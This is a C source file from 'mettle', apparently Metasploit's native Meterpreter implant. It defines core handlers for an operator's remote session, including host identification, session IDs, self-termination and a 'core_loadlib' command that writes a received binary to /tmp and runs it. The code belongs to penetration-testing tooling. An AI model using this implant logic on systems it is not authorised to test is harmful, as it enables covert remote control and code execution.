/**
 * Copyright 2015 Rapid7
 * @brief Core API calls
 * @file tlv_coreapi.c
 */

#include "log.h"
#include "tlv.h"
#include "extensions.h"

#include <mettle.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

static void add_method(const char *method, void *arg)
{
	struct tlv_packet **p = arg;
	*p = tlv_packet_add_str(*p, TLV_TYPE_STRING, method);
}

static struct tlv_packet *enumextcmd(struct tlv_handler_ctx *ctx)
{
	struct mettle *m = ctx->arg;
	const char *extension = tlv_packet_get_str(ctx->req, TLV_TYPE_STRING);

	/*
	 * When enumerating stdapi, send everything we know about so far
	 */
	if (extension == NULL || strcmp(extension, "stdapi") == 0) {
		extension = NULL;
	}

	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);
	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
	tlv_dispatcher_iter_extension_methods(td, extension, add_method, &p);
	return p;
}

static struct tlv_packet *core_shutdown(struct tlv_handler_ctx *ctx)
{
	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_FAILURE);

#ifdef SIGKILL
	/*
	 * First try to kill ourselves with a signal
	 */
	raise(SIGKILL);
#endif

	/*
	 * Try to simply exit
	 */
	exit(0);

	/*
	 * Finally, trigger a SIGSEGV
	 */
	void (*nada) (void) = NULL;
	nada();

	return p;
}

static struct tlv_packet *core_get_session_guid(struct tlv_handler_ctx *ctx)
{
	struct mettle *m = ctx->arg;
	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);
	const char *session_guid = tlv_dispatcher_get_session_guid(td);

	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
	return tlv_packet_add_raw(p, TLV_TYPE_SESSION_GUID, session_guid, SESSION_GUID_LEN);
}

static struct tlv_packet *core_set_session_guid(struct tlv_handler_ctx *ctx)
{
	size_t guid_len = 0;
	struct mettle *m = ctx->arg;
	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);
	char *guid = tlv_packet_get_raw(ctx->req, TLV_TYPE_SESSION_GUID, &guid_len);

	if (!guid || guid_len != SESSION_GUID_LEN)
		return tlv_packet_response_result(ctx, TLV_RESULT_FAILURE);

	tlv_dispatcher_set_session_guid(td, guid);
	return tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
}

static struct tlv_packet *core_machine_id(struct tlv_handler_ctx *ctx)
{
	struct mettle *m = ctx->arg;

	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
	return tlv_packet_add_fmt(p, TLV_TYPE_MACHINE_ID,
		"%s:%s", mettle_get_fqdn(m), mettle_get_machine_id(m));
}

static struct tlv_packet *core_set_uuid(struct tlv_handler_ctx *ctx)
{
	size_t uuid_len = 0;
	struct mettle *m = ctx->arg;
	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);
	char *uuid = tlv_packet_get_raw(ctx->req, TLV_TYPE_UUID, &uuid_len);

	if (uuid && uuid_len) {
		tlv_dispatcher_set_uuid(td, uuid, uuid_len);
	}

	return tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
}

static struct tlv_packet *core_uuid(struct tlv_handler_ctx *ctx)
{
	size_t uuid_len;
	struct mettle *m = ctx->arg;
	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);
	const char *uuid = tlv_dispatcher_get_uuid(td, &uuid_len);

	if (uuid && uuid_len) {
	       struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
	       return tlv_packet_add_raw(p, TLV_TYPE_UUID, uuid, uuid_len);
	}

	return tlv_packet_response_result(ctx, TLV_RESULT_FAILURE);
}

static struct tlv_packet *core_negotiate_tlv_encryption(struct tlv_handler_ctx *ctx)
{
	return tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
} 

static struct tlv_packet *core_loadlib(struct tlv_handler_ctx *ctx)
{
	uint32_t flags;
	size_t extension_len;
	struct mettle *m = ctx->arg;
	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);
	struct tlv_packet *p = tlv_packet_response(ctx);
	int fd = -1;
	char *full_path;
	int tlv_result = TLV_RESULT_FAILURE;
	const char *library_path = tlv_packet_get_str(ctx->req, TLV_TYPE_LIBRARY_PATH);
	const unsigned char *extension = tlv_packet_get_raw(ctx->req, TLV_TYPE_DATA, &extension_len);

	tlv_packet_get_u32(ctx->req, TLV_TYPE_FLAGS, &flags);
	if (!extension || extension_len == 0) {
		log_error("No extension received");
		goto done;
	}

	if (!library_path) {
		log_error("No extension name specified");
		goto done;
	}

	/* XXX temporary measure of writing to disk */
	if (asprintf(&full_path, "/tmp/%s", library_path) <=0) {
		log_error("Failed to alloc mem");
		goto done;
	}

	fd = open(full_path, O_CREAT|O_WRONLY, 0755);
	if(fd == -1) {
		log_error("Failed to open '%s': %s", full_path, strerror(errno));
		goto done;
	}

	int ret_val = write(fd, extension, extension_len);
	if (ret_val == -1) {
		log_error("Failed to write '%s': %s", full_path, strerror(errno));
		goto done;
	}
	if (ret_val != extension_len) {
		log_error("Failed to write the entire extension '%s' to disk", full_path);
		goto done;
	}
	close(fd);
	fd = -1;

	if (extension_start(m, full_path, NULL) == NULL) {
		log_error("Failed to start extension '%s'", full_path);
		goto done;
	}

	tlv_result = TLV_RESULT_SUCCESS;
done:
	if (fd != -1) {
		close(fd);
	}
	free(full_path);
	p = tlv_packet_add_result(p, tlv_result);
	return p;
}

void tlv_register_coreapi(struct mettle *m)
{
	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);

	tlv_dispatcher_add_handler(td, "core_enumextcmd", enumextcmd, m);
	tlv_dispatcher_add_handler(td, "core_machine_id", core_machine_id, m);
	tlv_dispatcher_add_handler(td, "core_set_uuid", core_set_uuid, m);
	tlv_dispatcher_add_handler(td, "core_uuid", core_uuid, m);
	tlv_dispatcher_add_handler(td, "core_get_session_guid", core_get_session_guid, m);
	tlv_dispatcher_add_handler(td, "core_set_session_guid", core_set_session_guid, m);
	tlv_dispatcher_add_handler(td, "core_negotiate_tlv_encryption", core_negotiate_tlv_encryption, m);
	tlv_dispatcher_add_handler(td, "core_loadlib", core_loadlib, m);
	tlv_dispatcher_add_handler(td, "core_shutdown", core_shutdown, m);
}
